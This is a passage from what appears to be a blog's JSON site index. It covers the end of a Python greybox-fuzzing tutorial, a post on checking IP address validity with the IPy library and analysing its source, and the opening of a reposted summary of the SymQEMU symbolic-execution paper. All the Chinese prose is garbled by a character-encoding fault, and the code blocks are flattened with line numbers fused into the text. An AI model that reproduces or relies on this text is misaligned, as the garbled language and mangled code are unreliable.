print(t.elapsed_time()) # print(all_cov) print(max(bostgreybox_coverage)) print(bostgreybox_fuzzer.population) print(fast_schedule.path_frequency) å½“eå¸¸é‡ä¸º5ï¼Œfuzzæ¬¡æ•°ä¸º10000æ—¶ ç»ˆç«¯: 12345$&gt; python3 greyboxFuzzer_test.py0.7238507586[good, bg, ba, bad, bad!]&#123;&#x27;457ea827d94ad12c048397ad55d1d030&#x27;: 6005, &#x27;193f98a7531d0e9a97a787562b595798&#x27;: 2743, &#x27;80819e22a0983ebc96997fa6fe569ca8&#x27;: 942, &#x27;00deafe57bb3539da4ee5a01d5fb4ebe&#x27;: 260, &#x27;c9a83c563333fdb248e6a10e56aa1f12&#x27;: 50&#125; å½“æˆ‘ä»¬è°ƒæ•´eä¸º15ï¼Œtrialsä¸º4000æ—¶ ç»ˆç«¯: 12345$&gt; python3 greyboxFuzzer_test.py0.2516159326[good, bg=oyodx, ba7g=oyodz,, badBag(yoC&gt;,, bad!sgymIn&#125;C1&lt;]&#123;&#x27;fbdecb7cc922b14d42f4a4a4d5dc191a&#x27;: 1318, &#x27;a2229a3e7370c6970c660ec9f7e2a67b&#x27;: 763, &#x27;1968f4fca86e35f60decaae9699c760d&#x27;: 502, &#x27;4ea124940551c3bbb6d1f68e8337375e&#x27;: 212, &#x27;79723bb9baab9395463be50202282c3e&#x27;: 205&#125; å¯ä»¥å‘ç°ï¼Œé€šè¿‡ä¸€å®šè°ƒæ•´exponentå¸¸é‡ï¼Œæˆ‘ä»¬å¯ä»¥æ¥è¿‘ä¸€ä¸ªæ›´æœ‰æ•ˆç‡çš„æµ‹è¯•æ¬¡æ•°å€¼ ä¸‹å›¾æ˜¯ä¸‰ä¸ªä¸åŒçš„Fuzzerçš„æ•ˆç‡å¯¹æ¯” æˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œä½¿ç”¨AFLFastScheduleä¼˜åŒ–è¿‡çš„Fuzzeråœ¨ä¸‰è€…ä¹‹ä¸­è¦†ç›–crashmeçš„æ•ˆç‡ç¡®å®æ˜¯è¦æ›´å¿«çš„å¤šã€‚ æ€»ç»“é€šè¿‡è¯¥éƒ¨åˆ†çš„å­¦ä¹ ï¼Œæˆ‘ä»¬åŸºæœ¬äº†è§£äº†ä»€ä¹ˆæ˜¯Fuzzingï¼Œä»¥åŠå¦‚ä½•ç¼–å†™åŸºäºpythonç¨‹åºçš„Fuzzerï¼ŒåŒæ—¶æ ¹æ®ç›¸å…³ç†è®ºæŒ‡å¯¼æ¥ä¼˜åŒ–æˆ‘ä»¬çš„Fuzzerã€‚","categories":[],"tags":[{"name":"Fuzzing","slug":"Fuzzing","permalink":"https://mundi-xu.github.io/tags/Fuzzing/"}]},{"title":"åˆ©ç”¨IPyåˆ¤æ–­IPåœ°å€çš„åˆæ³•æ€§","slug":"åˆ©ç”¨IPyåˆ¤æ–­IPåœ°å€çš„åˆæ³•æ€§","date":"2021-03-02T15:00:11.000Z","updated":"2021-03-09T09:36:55.740Z","comments":true,"path":"2021/03/02/åˆ©ç”¨IPyåˆ¤æ–­IPåœ°å€çš„åˆæ³•æ€§/","link":"","permalink":"https://mundi-xu.github.io/2021/03/02/%E5%88%A9%E7%94%A8IPy%E5%88%A4%E6%96%ADIP%E5%9C%B0%E5%9D%80%E7%9A%84%E5%90%88%E6%B3%95%E6%80%A7/","excerpt":"åˆ©ç”¨IPyæ¨¡å—çš„IPç±»å¤„ç†å¸¸è§æ ¼å¼çš„IPåœ°å€ï¼Œé™„IPåœ°å€æ ¼å¼è§„èŒƒå’ŒIPyæºç ç®€æ","text":"ipåœ°å€æ ¼å¼è§„èŒƒipv4åœ¨CIDRè¡¨ç¤ºæ³•ä¸­ï¼Œå‰ç¼€æ˜¾ç¤ºä¸º4ä¸ªå…«ä½å­—èŠ‚ï¼Œå°±åƒä¼ ç»Ÿçš„IPv4åœ°å€ä¸€æ ·ï¼Œåè·Ÿâ€/â€œæ–œæ å’Œä¸€ä¸ª0ï½32ä¹‹é—´çš„åè¿›åˆ¶å€¼æ¥æè¿°æœ‰æ•ˆä½æ•°ã€‚[1] For example, the legacy â€œClass Bâ€ network 172.16.0.0, with an implied network mask of 255.255.0.0, is defined as the prefix 172.16.0.0/16, the â€œ/16â€ indicating that the mask to extract the network portion of the prefix is a 32-bit value where the most significant 16 bits are ones and the least significant 16 bits are zeros.Similarly, the legacy â€œClass Câ€ network number 192.168.99.0 is defined as the prefix 192.168.99.0/24; the most significant 24 bits are ones and the least significant 8 bits are zeros. ipv6There are three conventional forms for representing IPv6 addresses as text strings: [2] The preferred form is x:x:x:x:x:x:x:x, where the â€˜xâ€™s are the hexadecimal values of the eight 16-bit pieces of the address.Examples: FEDC:BA98:7654:3210:FEDC:BA98:7654:3210 1080:0:0:0:8:800:200C:417A Note that it is not necessary to write the leading zeros in an individual field, but there must be at least one numeral in every field (except for the case described in 2.). Due to some methods of allocating certain styles of IPv6 addresses, it will be common for addresses to contain long strings of zero bits. In order to make writing addresses containing zero bits easier a special syntax is available to compress the zeros. The use of â€œ::â€ indicates multiple groups of 16-bits of zeros. The â€œ::â€ can only appear once in an address. The â€œ::â€ can also be used to compress the leading and/or trailing zeros in an address.For example the following addresses: 1080:0:0:0:8:800:200C:417A a unicast address FF01:0:0:0:0:0:0:101 a multicast address 0:0:0:0:0:0:0:1 the loopback address 0:0:0:0:0:0:0:0 the unspecified addresses may be represented as: 1080::8:800:200C:417A a unicast address FF01::101 a multicast address ::1 the loopback address :: the unspecified addresses An alternative form that is sometimes more convenient when dealing with a mixed environment of IPv4 and IPv6 nodes is x:x:x:x:x:x:d.d.d.d, where the â€˜xâ€™s are the hexadecimal values of the six high-order 16-bit pieces of the address, and the â€˜dâ€™s are the decimal values of the four low-order 8-bit pieces of the address (standard IPv4 representation). Examples: 0:0:0:0:0:0:13.1.68.3 0:0:0:0:0:FFFF:129.144.52.38 or in compressed form: ::13.1.68.3 ::FFFF:129.144.52.38 IPv6åœ°å€å‰ç¼€çš„æ–‡æœ¬è¡¨ç¤ºç±»ä¼¼äºä»¥CIDRè¡¨ç¤ºæ³•ç¼–å†™IPv4åœ°å€å‰ç¼€çš„æ–¹å¼: IPv6åœ°å€/æœ‰æ•ˆä½æ•° IPyæ¨¡å—çš„ä½¿ç”¨å®‰è£…Ipyæ¨¡å— 1pip install IPy IPyæ¨¡å—åŒ…å«IPç±»ï¼Œä½¿ç”¨å®ƒå¯ä»¥å¤„ç†ç»å¤§éƒ¨åˆ†æ ¼å¼çš„IPv4æˆ–IPv6åœ°å€[3]ã€‚ It can detect about a dozen different ways of expressing IP addresses and networks, parse them and distinguish between IPv4 and IPv6 addresses: é€šè¿‡versionæ–¹æ³•æ¥åŒºåˆ†å‡ºIPv4å’ŒIPv6 1234&gt;&gt;&gt; IP(&#x27;10.0.0.0/8&#x27;).version()4&gt;&gt;&gt; IP(&#x27;::1&#x27;).version()6 é€šè¿‡strNormalæŒ‡å®šä¸åŒçš„wantprefixlenå€¼æ§åˆ¶è¾“å‡º 123456789101112131415161718192021&gt;&gt;&gt; IP(&#x27;10.0.0.0/32&#x27;).strNormal()&#x27;10.0.0.0&#x27;&gt;&gt;&gt; IP(&#x27;10.0.0.0/24&#x27;).strNormal()&#x27;10.0.0.0/24&#x27;&gt;&gt;&gt; IP(&#x27;10.0.0.0/24&#x27;).strNormal(0)&#x27;10.0.0.0&#x27;&gt;&gt;&gt; IP(&#x27;10.0.0.0/24&#x27;).strNormal(1)&#x27;10.0.0.0/24&#x27;&gt;&gt;&gt; IP(&#x27;10.0.0.0/24&#x27;).strNormal(2)&#x27;10.0.0.0/255.255.255.0&#x27;&gt;&gt;&gt; IP(&#x27;10.0.0.0/24&#x27;).strNormal(3)&#x27;10.0.0.0-10.0.0.255&#x27;&gt;&gt;&gt; ip = IP(&#x27;10.0.0.0&#x27;)&gt;&gt;&gt; print(ip)10.0.0.0&gt;&gt;&gt; ip.NoPrefixForSingleIp = None&gt;&gt;&gt; print(ip)10.0.0.0/32&gt;&gt;&gt; ip.WantPrefixLen = 3&gt;&gt;&gt; print(ip)10.0.0.0-10.0.0.0 å®ç°ä»£ç 123456789101112131415161718192021from IPy import IPdef is_ip(ip_str): try: ip = IP(ip_str) return True except Exception as e: print(&quot;The address is illegal.&quot;) return Falseip_str = input(&quot;Please enter the IP address:\\n &quot;)if is_ip(ip_str): ip = IP(ip_str) version = ip.version() print(&quot;The address is IPv&quot;, version, sep=&#x27;&#x27;) if ip.len() &gt; 1: print(&quot;Available address segment is:&quot;, ip.strNormal(3)) print(&quot;The number of address is:&quot;, ip.len()) else: print(&quot;The binary address is:&quot;, ip.strBin()) æµ‹è¯•ç»“æœ1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465testcase 1Please enter the IP address: 0.0.0.0The address is IPv4The binary address is: 00000000000000000000000000000000---------------------------------testcase 2Please enter the IP address: 255.255.255.255The address is IPv4The binary address is: 11111111111111111111111111111111---------------------------------testcase 3Please enter the IP address: 256.0.1.1The address is illegal.---------------------------------testcase 4Please enter the IP address: 192.168.0.0/24The address is IPv4Available address segment is: 192.168.0.0-192.168.0.255The number of address is: 256---------------------------------testcase 5Please enter the IP address: 192.168.1.1/24The address is illegal.---------------------------------testcase 6Please enter the IP address: ::1/128The address is IPv6The binary address is: 00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001---------------------------------testcase 7Please enter the IP address: FEDC:BA98:7654:3210:FEDC:BA98:7654:3210The address is IPv6The binary address is: 11111110110111001011101010011000011101100101010000110010000100001111111011011100101110101001100001110110010101000011001000010000---------------------------------testcase 8Please enter the IP address: 1080::8:800:200C:417A/24The address is illegal.---------------------------------testcase 9Please enter the IP address: FF01::101The address is IPv6The binary address is: 11111111000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000001---------------------------------testcase 10Please enter the IP address: ::The address is IPv6The binary address is: 00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000---------------------------------testcase 11Please enter the IP address: ::/64The address is IPv6Available address segment is: 0:0:0:0:0:0:0:0-0000:0000:0000:0000:ffff:ffff:ffff:ffffThe number of address is: 18446744073709551616--------------------------------- IPyæºç åˆ†æ IPy - class and tools for handling of IPv4 and IPv6 addresses and networks. æºç ç‰ˆæœ¬ä¸º1.01 __version__ = &#39;1.01&#39; [4] ipversion1234567891011121314151617if isinstance(data, INT_TYPES): self.ip = int(data) if ipversion == 0: if self.ip &lt;= MAX_IPV4_ADDRESS: ipversion = 4 else: ipversion = 6 if ipversion == 4: if self.ip &gt; MAX_IPV4_ADDRESS: raise ValueError(&quot;IPv4 Address can&#x27;t be larger than %x: %x&quot; % (MAX_IPV4_ADDRESS, self.ip)) prefixlen = 32 elif ipversion == 6: if self.ip &gt; MAX_IPV6_ADDRESS: raise ValueError(&quot;IPv6 Address can&#x27;t be larger than %x: %x&quot; % (MAX_IPV6_ADDRESS, self.ip)) prefixlen = 128 else: raise ValueError(&quot;only IPv4 and IPv6 supported&quot;) æ ¹æ®å¤„ç†åçš„ipé•¿åº¦åˆ¤æ–­ç±»å‹ï¼Œå…¶ä¸­MAX_IPV4_ADDRESS = 0xffffffff, MAX_IPV6_ADDRESS = 0xffffffffffffffffffffffffffffffff strbin12345bits = _ipVersionToLen(self._ipversion)if self.WantPrefixLen == None and wantprefixlen == None: wantprefixlen = 0ret = _intToBin(self.ip)return &#x27;0&#x27; * (bits - len(ret)) + ret + self._printPrefix(wantprefixlen) strnormal123456789if self.WantPrefixLen == None and wantprefixlen == None: wantprefixlen = 1if self._ipversion == 4: ret = self.strFullsize(0) # Return a string representation in the non-mangled format.elif self._ipversion == 6: ret = &#x27;:&#x27;.join([&quot;%x&quot; % x for x in [int(x, 16) for x in self.strFullsize(0).split(&#x27;:&#x27;)]])else: raise ValueError(&quot;only IPv4 and IPv6 supported&quot;) len123bits = _ipVersionToLen(self._ipversion) # Return number of bits in address for a certain IP version.(32 or 128)locallen = bits - self._prefixlenreturn 2 ** locallen èŒƒå›´IPåˆ†è§£ 123if isinstance(key, slice): return [IP(IPint.__getitem__(self, x), ipversion=self._ipversion) for x in xrange(*key.indices(len(self)))] return IP(IPint.__getitem__(self, key), ipversion=self._ipversion) getIPv4Map12345678if self._ipversion != 6: return Noneif (self.ip &gt;&gt; 32) != 0xffff: return Noneipv4 = self.ip &amp; MAX_IPV4_ADDRESSif self._prefixlen != 128: ipv4 = &#x27;%s/%s&#x27; % (ipv4, 32-(128-self._prefixlen))return IP(ipv4, ipversion=4) IPè¾“å…¥æ ¼å¼æ£€æµ‹è§£æå­—ç¬¦ä¸²å¹¶è¿”å›ç›¸åº”çš„æ•´æ•°å‹IPåœ°å€ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849def parseAddress(ipstr, ipversion=0): try: hexval = int(ipstr, 16) except ValueError: hexval = None try: intval = int(ipstr, 10) except ValueError: intval = None if ipstr.startswith(&#x27;0x&#x27;) and hexval is not None: if hexval &gt; MAX_IPV6_ADDRESS: raise ValueError(&quot;IP Address can&#x27;t be larger than %x: %x&quot; % (MAX_IPV6_ADDRESS, hexval)) if hexval &lt;= MAX_IPV4_ADDRESS: return (hexval, 4) else: return (hexval, 6) if ipstr.find(&#x27;:&#x27;) != -1: return (_parseAddressIPv6(ipstr), 6) elif len(ipstr) == 32 and hexval is not None: # assume IPv6 in pure hexadecimal notation return (hexval, 6) elif ipstr.find(&#x27;.&#x27;) != -1 or (intval is not None and intval &lt; 256 and ipversion != 6): # assume IPv4 (&#x27;127&#x27; gets interpreted as &#x27;127.0.0.0&#x27;) bytes = ipstr.split(&#x27;.&#x27;) if len(bytes) &gt; 4: raise ValueError(&quot;IPv4 Address with more than 4 bytes&quot;) bytes += [&#x27;0&#x27;] * (4 - len(bytes)) bytes = [int(x) for x in bytes] for x in bytes: if x &gt; 255 or x &lt; 0: raise ValueError(&quot;%r: single byte must be 0 &lt;= byte &lt; 256&quot; % (ipstr)) return ((bytes[0] &lt;&lt; 24) + (bytes[1] &lt;&lt; 16) + (bytes[2] &lt;&lt; 8) + bytes[3], 4) elif intval is not None: # we try to interprete it as a decimal digit - # this ony works for numbers &gt; 255 ... others # will be interpreted as IPv4 first byte if intval &gt; MAX_IPV6_ADDRESS: raise ValueError(&quot;IP Address can&#x27;t be larger than %x: %x&quot; % (MAX_IPV6_ADDRESS, intval)) if intval &lt;= MAX_IPV4_ADDRESS and ipversion != 6: return (intval, 4) else: return (intval, 6) raise ValueError(&quot;IP Address format was invalid: %s&quot; % ipstr) åˆ†è§£IPv6åœ°å€ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667def _parseAddressIPv6(ipstr): items = [] index = 0 fill_pos = None while index &lt; len(ipstr): text = ipstr[index:] if text.startswith(&quot;::&quot;): if fill_pos is not None: # Invalid IPv6, eg. &#x27;1::2::&#x27; raise ValueError(&quot;%r: Invalid IPv6 address: more than one &#x27;::&#x27;&quot; % ipstr) fill_pos = len(items) index += 2 continue pos = text.find(&#x27;:&#x27;) if pos == 0: # Invalid IPv6, eg. &#x27;1::2:&#x27; raise ValueError(&quot;%r: Invalid IPv6 address&quot; % ipstr) if pos != -1: items.append(text[:pos]) if text[pos:pos+2] == &quot;::&quot;: index += pos else: index += pos+1 if index == len(ipstr): # Invalid IPv6, eg. &#x27;1::2:&#x27; raise ValueError(&quot;%r: Invalid IPv6 address&quot; % ipstr) else: items.append(text) break if items and &#x27;.&#x27; in items[-1]: # IPv6 ending with IPv4 like &#x27;::ffff:192.168.0.1&#x27; if (fill_pos is not None) and not (fill_pos &lt;= len(items)-1): # Invalid IPv6: &#x27;ffff:192.168.0.1::&#x27; raise ValueError(&quot;%r: Invalid IPv6 address: &#x27;::&#x27; after IPv4&quot; % ipstr) value = parseAddress(items[-1])[0] items = items[:-1] + [&quot;%04x&quot; % (value &gt;&gt; 16), &quot;%04x&quot; % (value &amp; 0xffff)] # Expand fill_pos to fill with &#x27;0&#x27; # [&#x27;1&#x27;,&#x27;2&#x27;] with fill_pos=1 =&gt; [&#x27;1&#x27;, &#x27;0&#x27;, &#x27;0&#x27;, &#x27;0&#x27;, &#x27;0&#x27;, &#x27;0&#x27;, &#x27;0&#x27;, &#x27;2&#x27;] if fill_pos is not None: diff = 8 - len(items) if diff &lt;= 0: raise ValueError(&quot;%r: Invalid IPv6 address: &#x27;::&#x27; is not needed&quot; % ipstr) items = items[:fill_pos] + [&#x27;0&#x27;]*diff + items[fill_pos:] # Here we have a list of 8 strings if len(items) != 8: # Invalid IPv6, eg. &#x27;1:2:3&#x27; raise ValueError(&quot;%r: Invalid IPv6 address: should have 8 hextets&quot; % ipstr) # Convert strings to long integer value = 0 index = 0 for item in items: try: item = int(item, 16) error = not(0 &lt;= item &lt;= 0xffff) except ValueError: error = True if error: raise ValueError(&quot;%r: Invalid IPv6 address: invalid hexlet %r&quot; % (ipstr, item)) value = (value &lt;&lt; 16) + item index += 1 return value é€šè¿‡åˆ†å‰²ç§»ä½çš„æ–¹å¼è½¬æ¢è¾“å…¥ä¸ºIP å‚è€ƒé“¾æ¥RFC 791; RFC 4632 â†©RFC 2373 â†©https://pypi.org/project/IPy/#description â†©https://github.com/autocracy/python-ipy â†©","categories":[],"tags":[{"name":"IPy","slug":"IPy","permalink":"https://mundi-xu.github.io/tags/IPy/"},{"name":"python","slug":"python","permalink":"https://mundi-xu.github.io/tags/python/"},{"name":"lab","slug":"lab","permalink":"https://mundi-xu.github.io/tags/lab/"},{"name":"ip","slug":"ip","permalink":"https://mundi-xu.github.io/tags/ip/"}]},{"title":"ã€è½¬è½½ã€‘å¸¦ä½ ææ‡‚ç¬¦å·æ‰§è¡Œçš„å‰ä¸–ä»Šç”Ÿä¸æœ€è¿‘æŠ€æœ¯","slug":"å¸¦ä½ ææ‡‚ç¬¦å·æ‰§è¡Œçš„å‰ä¸–ä»Šç”Ÿä¸æœ€è¿‘æŠ€æœ¯","date":"2021-02-23T07:30:00.000Z","updated":"2021-03-12T09:56:32.676Z","comments":false,"path":"2021/02/23/å¸¦ä½ ææ‡‚ç¬¦å·æ‰§è¡Œçš„å‰ä¸–ä»Šç”Ÿä¸æœ€è¿‘æŠ€æœ¯/","link":"","permalink":"https://mundi-xu.github.io/2021/02/23/%E5%B8%A6%E4%BD%A0%E6%90%9E%E6%87%82%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C%E7%9A%84%E5%89%8D%E4%B8%96%E4%BB%8A%E7%94%9F%E4%B8%8E%E6%9C%80%E8%BF%91%E6%8A%80%E6%9C%AF/","excerpt":"iddmå¸¦ä½ è¯»è®ºæ–‡â€”â€”SymQEMU:Compilation-based symbolic execution for binaries","text":"æœ¬æ–‡ç”±iddmåŸåˆ›å‘å¸ƒè½¬è½½è‡ª https://www.anquanke.com/post/id/231413 iddmå¸¦ä½ è¯»è®ºæ–‡â€”â€”SymQEMU:Compilation-based symbolic execution for binaries æœ¬ç¯‡æ–‡ç« æ”¶å½•äº2021å¹´ç½‘ç»œå®‰å…¨é¡¶ä¼šNDSSï¼Œä»‹ç»äº†æœ€æ–°çš„ç¬¦å·æ‰§è¡ŒæŠ€æœ¯ï¼Œå¹¶ä¸”æ¸…æ™°åœ°æ¯”è¾ƒäº†å½“å‰æµè¡Œçš„å„ç§ç¬¦å·æ‰§è¡Œçš„å¼•æ“çš„ä¼˜åŠ£åŠ¿ï¼Œå¯ä»¥æ¯”è¾ƒç³»ç»Ÿçš„äº†è§£ç¬¦å·æ‰§è¡ŒæŠ€æœ¯çš„ç›¸å…³çŸ¥è¯† title = {{SymQEMU}: Compilation-based symbolic execution for binaries},author = {Poeplau, Sebastian and Francillon, AurÃƒÂ©lien},booktitle = {Network and Distributed System Security Symposium},year = 2021,organization = {Network &amp; Distributed System Security Symposium},month = {February},affiliations = {Eurecom, Code Intelligence},extralink = {Details: tools/symbolic_execution/symqemu.html}download_address = https://www.ndss-symposium.org/wp-content/uploads/2021-118-paper.pdf æ‘˜è¦ç¬¦å·æ‰§è¡ŒæŠ€æœ¯æ˜¯é’ˆå¯¹è½¯ä»¶åˆ†æå’Œbugæ£€æµ‹çš„å¼ºåŠ›æŠ€æœ¯ï¼ŒåŸºäºç¼–è¯‘çš„ç¬¦å·æ‰§è¡ŒæŠ€æœ¯æ˜¯æœ€è¿‘æå‡ºçš„ä¸€ç§æ–¹æ³•ï¼Œå½“å¯¹è±¡æºä»£ç å¯ä»¥å¾—åˆ°æ—¶å¯ä»¥æå‡ç¬¦å·æ‰§è¡Œçš„æ€§èƒ½ã€‚æœ¬æ–‡æå‡ºäº†ä¸€ç§æ–°çš„åŸºäºç¼–è¯‘çš„ï¼Œé’ˆå¯¹äºŒè¿›åˆ¶æ–‡ä»¶çš„ç¬¦å·æ‰§è¡ŒæŠ€æœ¯ã€‚æ­¤ç³»ç»Ÿåä¸ºsymqemuï¼Œåœ¨qemuåŸºç¡€ä¹‹ä¸Šå¼€å‘ï¼Œåœ¨å°†targetç¨‹åºè½¬æ¢ä¸ºhostæ¶æ„çš„æœºå™¨ç ä¹‹å‰ä¿®æ”¹å…¶IRï¼Œè¿™ä½¿å¾—symqemuèƒ½å¤Ÿå°†ç¼–è¯‘ç¬¦å·æ‰§è¡Œå¼•æ“çš„èƒ½åŠ›åº”ç”¨äºäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå¹¶ä¸”åœ¨ç»´æŒæ¶æ„ç‹¬ç«‹æ€§çš„åŒæ—¶èƒ½å¤Ÿè·å¾—æ€§èƒ½ä¸Šçš„æå‡ã€‚ æœ¬æ–‡æå‡ºäº†è¿™ä¸ªæ–¹æ³•ä»¥åŠå…¶å®ç°ï¼Œæˆ‘ä»¬åˆ©ç”¨ç»Ÿè®¡å­¦æ–¹æ³•è¯æ˜äº†ä»–æ¯”æœ€å…ˆè¿›çš„ç¬¦å·æ‰§è¡Œå¼•æ“s2eä»¥åŠqsymï¼Œåœ¨æŸäº›benchmarksä¸Šï¼Œä»–ç”šè‡³ç”±äºé’ˆå¯¹æºç å¸¦åˆ†æçš„symccã€‚å¹¶ä¸”åˆ©ç”¨symqemuåœ¨ç»è¿‡å¤šé‡æµ‹è¯•çš„libraryä¸Šå‘ç°äº†ä¸€ä¸ªä½ç½®æ¼æ´ï¼Œè¯æ˜äº†ä»–åœ¨å®é™…è½¯ä»¶ä¸­çš„å¯ç”¨æ€§ã€‚ ä»‹ç»ç¬¦å·æ‰§è¡ŒæŠ€æœ¯è¿‘å¹´æ¥å¤§åŠ›å‘å±•ï¼Œä¸€ç§æœ‰æ•ˆä½†æ˜¯ä»£ä»·å¤§çš„æŠ€æœ¯ï¼Œå…¶ç»å¸¸ä¸fuzzingæŠ€æœ¯æ··åˆï¼Œå¹¶æˆä¸ºæ··åˆfuzzingï¼Œfuzzingç”¨æ¥æ¢ç´¢å®¹æ˜“åˆ°è¾¾çš„è·¯å¾„ï¼Œè€Œç¬¦å·æ‰§è¡Œç”¨æ¥æ¢ç´¢ä¸æ˜“åˆ°è¾¾çš„è·¯å¾„ã€‚ é’ˆå¯¹ç¬¦å·æ‰§è¡ŒæŠ€æœ¯çš„é‡è¦ç‰¹å¾ä¹‹ä¸€å°±æ˜¯å…¶æ˜¯å¦éœ€è¦æä¾›æºä»£ç è¿›è¡Œåˆ†æï¼Œè€ŒçœŸå®ä¸–ç•Œä¸­çš„å¤§å¤šæ•°ç¨‹åº(ç”±äºæŸäº›åŸå› )æ˜¯ä¸æä¾›æºä»£ç çš„ã€‚ æ‰€ä»¥binary-onlyçš„ç¬¦å·æ‰§è¡ŒæŠ€æœ¯è¢«è¿«åˆ‡éœ€è¦ï¼Œä½†æ˜¯é¢ä¸´ä¸€ä¸ªä¸¤éš¾çš„å›°å¢ƒï¼Œåˆ°åº•æ˜¯é€‰æ‹©æ€§èƒ½çš„æå‡è¿˜æ˜¯æ¶æ„çš„ç‹¬ç«‹æ€§å‘¢ï¼Ÿæ¯”å¦‚ï¼ŒQSYMé’ˆå¯¹binaryæœ‰å¾ˆé«˜çš„æ€§èƒ½ï¼Œä½†æ˜¯å…¶ä»…é™äºx86å¤„ç†å™¨çš„æŒ‡ä»¤é›†ã€‚å®ƒä¸ä»…ä»…é€ æˆäº†ç³»ç»Ÿæ¶æ„ä¾èµ–æ€§ï¼Œå¹¶ä¸”ç”±äºç°åœ¨å¤„ç†å™¨æŒ‡ä»¤çš„åºå¤§æå‡äº†å…¶å¤æ‚æ€§ã€‚SEåˆ™æ˜¯å¯ä»¥è¢«å¹¿æ³›çš„åº”ç”¨ä½†æ˜¯æ€§èƒ½è¾ƒå·®ï¼ŒS2Eå¯ä»¥åˆ†æå¤šæ¶æ„ä»£ç ä»¥åŠå†…æ ¸ä»£ç ã€‚ç„¶è€Œä»–è¿™ä¹ˆåšçš„ä»£ä»·æ˜¯é’ˆå¯¹targetç¨‹åºçš„å¤šç§ç¿»è¯‘çš„æœ€ç»ˆè¡¨ç¤ºï¼Œå¯¼è‡´äº†å¤æ‚æ€§å‡é«˜ä»¥åŠå½±å“æ€§èƒ½ã€‚ åœ¨æœ¬æ–‡ä¸­ï¼Œæˆ‘ä»¬æå‡ºäº†ä¸€ä¸ªæ–¹æ³•ï¼ˆaï¼‰ç‹¬ç«‹äºè¢«æµ‹è¯•çš„ç¨‹åºçš„targetæ¶æ„ï¼ˆbï¼‰å®ç°å¤æ‚åº¦ä½ï¼ˆcï¼‰å…·æœ‰é«˜æ€§èƒ½ã€‚symqemuçš„å…³é”®æ˜¯qemuçš„cpu ä»¿çœŸå¯ä»¥åŒäºè½»é‡çº§çš„ç¬¦å·æ‰§è¡Œæœºåˆ¶ï¼šä¸æ˜¯åƒs2eä¸­ä½¿ç”¨ä¸­çš„é‚£ç§è®¡ç®—å¤æ‚åº¦é«˜çš„å°†targetç¨‹åºå‘IRçš„è½¬æ¢æ–¹å¼ï¼Œæˆ‘ä»¬hook qemuä¸­çš„äºŒè¿›åˆ¶è½¬æ¢æœºåˆ¶ä¸ºäº†å°†ç¬¦å·å¤„ç†ç›´æ¥ç¼–è¯‘åˆ°æœºå™¨ç ä¸­ã€‚è¿™æ ·ä½¿å¾—åœ¨æ€§èƒ½ä¼˜äºæœ€å…ˆè¿›ç¬¦å·æ‰§è¡Œç³»ç»Ÿçš„åŒæ—¶å¯ä»¥ä¿æŒåŠ å¤Ÿç‹¬ç«‹æ€§ã€‚ç›®å‰ï¼Œæˆ‘ä»¬é’ˆå¯¹äºlinuxç”¨æˆ·ç¨‹åº(ELF binaries)ï¼Œä½†æˆ‘ä»¬å¯ä»¥å°†å…¶æ‹“å±•åˆ°ä»»ä½•qemuæ”¯æŒçš„æ¶æ„ä¸­å–ï¼ŒåŒæ—¶æˆ‘ä»¬å°†symqemuå¼€æºæ¥åŠ é€Ÿæœªæ¥ç›¸å…³é¢†åŸŸçš„ç ”ç©¶ã€‚ å°†ç¬¦å·å¤„ç†ç¼–è¯‘åˆ°targetç¨‹åºä¸­åŒæ ·æ˜¯symccçš„æ ¸å¿ƒå·¥ä½œï¼Œå…¶æ€§èƒ½ä¼˜äºå…¶ä»–ç¬¦å·æ‰§è¡Œå¼•æ“ï¼Œä½†æ˜¯symccåªé’ˆå¯¹äºæœ‰æºç çš„ç¨‹åºã€‚symqemuæ€§èƒ½ä¼˜äºse2ä»¥åŠqsymï¼Œå¹¶ä¸”ç›¸æ¯”äºåŸºäºæºä»£ç çš„symccæ€§èƒ½æ¥è¯´ï¼ŒæŸäº›æƒ…å†µä¹Ÿæ˜¯å¯ä»¥æ¯”è¾ƒã€‚ æœ¬æ–‡å·¥ä½œä¸»è¦æœ‰ä»¥ä¸‹è´¡çŒ®ï¼š åˆ†æäº†å½“å‰æœ€å…ˆè¿›çš„binary-onlyçš„ç¬¦å·æ‰§è¡Œå¼•æ“å¹¶ä¸”æ˜ç¡®äº†å…¶è®¾è®¡ä¸­çš„ä¼˜åŠ¿å’ŒåŠ£åŠ¿ã€‚ æå‡ºäº†ä¸€ä¸ªæ–¹æ³•ï¼Œèåˆäº†å…¶ä»–å·¥å…·çš„ä¼˜åŠ¿ï¼Œé¿å…äº†å…¶ä»–å·¥å…·çš„ç¼ºç‚¹ï¼Œæ ¸å¿ƒideaæ˜¯åº”ç”¨åŸºäºç¼–è¯‘çš„ç¬¦å·æ‰§è¡ŒæŠ€æœ¯åˆ°binaryä¸Šï¼Œæˆ‘ä»¬å·¥å…·çš„æºä»£ç å¼€æºã€‚ è¿›è¡Œäº†è¯¦ç»†çš„è¯„ä»·è¯•éªŒï¼Œå¹¶ä¸”å®éªŒæ•°æ®ä»¥åŠå®éªŒè„šæœ¬å¼€æºã€‚ èƒŒæ™¯ç¬¦å·æ‰§è¡Œç¬¦å·æ‰§è¡Œçš„ç›®çš„æ˜¯åœ¨ç›®æ 